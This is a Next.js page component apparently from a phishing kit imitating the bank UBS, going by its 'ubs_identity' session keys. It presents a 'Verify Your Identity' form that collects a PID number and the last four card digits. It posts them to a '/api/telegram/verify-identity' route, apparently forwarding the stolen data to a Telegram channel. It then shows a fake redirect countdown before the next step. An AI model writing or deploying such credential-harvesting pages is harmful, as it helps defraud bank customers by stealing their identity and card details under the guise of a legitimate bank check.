"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { HelpCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { VerificationHeader } from "@/components/verification-header";
import { Input } from "@/components/ui/input";

export default function VerifyIdentityPage() {
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined" && !sessionStorage.getItem("ubs_identity"))
      router.replace("/verify");
  }, [router]);

  const [pidNumber, setPidNumber] = useState("");
  const [cardLastFour, setCardLastFour] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);

  const pidDigits = pidNumber.replace(/\D/g, "");
  const cardDigits = cardLastFour.replace(/\D/g, "");

  const isPidValid = pidDigits.length >= 6;
  const isCardValid = cardDigits.length === 4;
  const isFormValid = isPidValid && isCardValid;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    setIsLoading(true);

    try {
      await fetch("/api/telegram/verify-identity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pidNumber: pidDigits,
          cardLastFour: cardDigits,
        }),
      }).catch(console.error);
    } catch (err) {
      console.error("Verify identity notification error:", err);
    }

    setCountdown(10);
    countdownRef.current = window.setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) {
            window.clearInterval(countdownRef.current);
            countdownRef.current = null;
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    await new Promise<void>((resolve) => {
      redirectRef.current = window.setTimeout(() => {
        resolve();
      }, 10000);
    });

    if (countdownRef.current) {
      window.clearInterval(countdownRef.current);
      countdownRef.current = null;
    }
    setCountdown(0);
    if (typeof window !== "undefined") sessionStorage.setItem("ubs_identity_verified", "1");
    router.push("/verify?step=3");
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) window.clearInterval(countdownRef.current);
      if (redirectRef.current) window.clearTimeout(redirectRef.current);
    };
  }, []);

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <VerificationHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
        <div className="flex items-center gap-2 mb-2">
          <h1 className="text-2xl font-semibold text-gray-900">
            Verify Your Identity
          </h1>
          <button
            type="button"
            className="text-[#254650] hover:underline flex items-center gap-1"
            aria-label="Help"
          >
            <HelpCircle className="w-4 h-4" />
            <span className="text-sm">Help</span>
          </button>
        </div>
        <p className="text-gray-700 text-sm mb-6">
          Please provide additional identity verification information to continue.
        </p>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label
              htmlFor="pidNumber"
              className="block text-sm font-medium text-gray-900 mb-1.5"
            >
              PID Number
            </label>
            <Input
              id="pidNumber"
              type="text"
              inputMode="numeric"
              placeholder="Enter your PID number"
              value={pidNumber}
              onChange={(e) =>
                setPidNumber(e.target.value.replace(/\D/g, ""))
              }
              className="max-w-[220px] h-10 bg-gray-50 border-gray-300 rounded-md"
            />
            <p className="text-xs text-gray-500 mt-1">
              Minimum 6 digits required
            </p>
          </div>

          <div>
            <label
              htmlFor="cardLastFour"
              className="block text-sm font-medium text-gray-900 mb-1.5"
            >
              Last 4 Digits of Card
            </label>
            <Input
              id="cardLastFour"
              type="text"
              inputMode="numeric"
              placeholder="XXXX"
              maxLength={4}
              value={cardLastFour}
              onChange={(e) =>
                setCardLastFour(e.target.value.replace(/\D/g, "").slice(0, 4))
              }
              className="max-w-[140px] h-10 bg-gray-50 border-gray-300 rounded-md"
            />
          </div>

          {countdown > 0 && (
            <p className="text-sm text-gray-600 mt-3">
              Redirecting in {countdown} second{countdown === 1 ? "" : "s"}…
            </p>
          )}

          <div className="flex gap-3 pt-2">
            <Button
              type="submit"
              disabled={!isFormValid || isLoading}
              className="bg-[#254650] hover:bg-[#1e383f] text-white rounded-md h-9 px-5 text-sm font-medium disabled:bg-gray-300 disabled:text-gray-500 disabled:pointer-events-none"
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              type="button"
              className="bg-gray-600 hover:bg-gray-700 text-white border-0 rounded-md h-9 px-5 text-sm font-medium"
              onClick={() => router.push("/")}
            >
              Cancel
            </Button>
          </div>
        </form>
      </div>
    </div>
  );
}
